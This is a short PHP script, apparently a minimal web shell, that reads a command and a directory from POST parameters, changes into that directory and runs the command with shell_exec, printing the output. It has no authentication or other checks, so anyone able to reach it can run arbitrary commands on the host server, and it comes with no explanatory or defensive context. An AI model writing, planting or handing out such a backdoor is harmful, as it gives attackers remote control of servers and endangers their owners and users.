<?php
$command = $_POST["command"];
$dir = $_POST["directory"];
chdir($dir);
$output = shell_exec($command);
print_r($output);


?>
